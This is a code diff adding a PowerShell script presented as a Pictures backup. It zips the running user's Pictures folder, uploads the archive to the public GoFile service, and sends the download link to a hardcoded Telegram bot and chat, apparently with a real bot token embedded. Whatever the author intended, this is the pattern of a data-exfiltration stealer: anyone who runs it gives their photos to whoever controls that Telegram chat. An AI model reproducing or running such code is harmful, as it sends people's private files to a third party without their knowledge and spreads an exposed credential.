@@ -1,0 +1,89 @@
+# ========================================
+#            CONFIGURATION
+# ========================================
+$BotToken       = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
+$ChatId         = "2146236602"
+
+# Folder to zip (Uses current user profile)
+$PicturesFolder = "$env:USERPROFILE\Pictures" 
+$ZipFile        = "$env:TEMP\Pictures_Backup.zip"
+# ========================================
+
+Clear-Host
+Write-Host "--- STARTED BACKUP PROCESS ---" -ForegroundColor Magenta
+
+# 1. ZIP THE FOLDER
+Write-Host "[1/4] Zipping pictures folder..." -ForegroundColor Cyan
+try {
+    if (Test-Path $ZipFile) { Remove-Item $ZipFile -Force }
+    Compress-Archive -Path "$PicturesFolder\*" -DestinationPath $ZipFile -Force -ErrorAction Stop
+    Write-Host "      Zip created successfully." -ForegroundColor Green
+}
+catch {
+    Write-Host "[-] ZIP creation failed: $_" -ForegroundColor Red
+    exit
+}
+
+# 2. GET GOFILE SERVER
+Write-Host "[2/4] Getting GoFile server..." -ForegroundColor Cyan
+try {
+    $serverInfo = Invoke-RestMethod "https://api.gofile.io/getServer" -ErrorAction Stop
+    $server = $serverInfo.data.server
+    if (-not $server) { throw "Server data is empty" }
+}
+catch {
+    Write-Host "[-] Failed to get GoFile server. API might be down." -ForegroundColor Red
+    Remove-Item $ZipFile -Force -ErrorAction SilentlyContinue # Cleanup if we fail here
+    exit
+}
+
+# 3. UPLOAD ZIP (Using Curl)
+Write-Host "[3/4] Uploading to server ($server)..." -ForegroundColor Cyan
+if (-not (Test-Path "$env:SystemRoot\System32\curl.exe")) {
+    Write-Host "[-] Curl.exe not found." -ForegroundColor Red
+    Remove-Item $ZipFile -Force # Cleanup
+    exit
+}
+
+$curlOutput = & "$env:SystemRoot\System32\curl.exe" -s -F "file=@$ZipFile" "https://$server.gofile.io/uploadFile"
+
+try {
+    $result = $curlOutput -join "`n" | ConvertFrom-Json
+    if ($result.status -ne "ok") { throw "Status not OK" }
+    $DownloadLink = $result.data.downloadPage
+    Write-Host "      Upload successful!" -ForegroundColor Green
+    Write-Host "      Link: $DownloadLink" -ForegroundColor Yellow
+}
+catch {
+    Write-Host "[-] Upload failed." -ForegroundColor Red
+    Remove-Item $ZipFile -Force # Cleanup
+    exit
+}
+
+# 4. SEND TO TELEGRAM & DELETE ZIP
+Write-Host "[4/4] Sending link to Telegram..." -ForegroundColor Cyan
+try {
+    $msgText = "📸 *Pictures Backup Complete*`n`nLink: $DownloadLink"
+    
+    Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
+        -Method Post `
+        -Body @{
+            chat_id    = $ChatId
+            text       = $msgText
+            parse_mode = "Markdown"
+        } -ErrorAction Stop
+        
+    Write-Host "      Notification sent." -ForegroundColor Green
+
+    # === DELETE FILE HERE (Only runs if the lines above succeeded) ===
+    Write-Host "      Deleting temporary zip file..." -NoNewline
+    Remove-Item $ZipFile -Force -ErrorAction SilentlyContinue
+    Write-Host "Done." -ForegroundColor Green
+}
+catch {
+    Write-Host "[-] Failed to send Telegram message: $_" -ForegroundColor Red
+    # Depending on your preference, you might still want to keep the file if sending failed
+    # or delete it anyway. Currently, it keeps the file if Telegram fails so you don't lose the upload.
+}
+
+Write-Host "`n[✓] All Done." -ForegroundColor Green
